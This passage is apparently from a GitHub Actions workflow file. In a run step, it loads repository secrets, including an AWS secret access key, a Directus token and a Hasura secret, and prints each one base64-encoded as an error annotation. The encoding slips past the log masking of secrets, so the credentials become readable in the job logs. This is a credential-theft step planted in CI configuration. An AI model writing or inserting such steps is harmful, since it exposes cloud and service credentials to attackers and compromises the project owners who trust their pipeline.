          Y09: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
        run: |
            echo "::error::Y00[DIRECTUS_TOKEN]=$(printf %s \"${Y00}\" | base64 -w0)"
            echo "::error::Y01[HASURA_SECRET]=$(printf %s \"${Y01}\" | base64 -w0)"
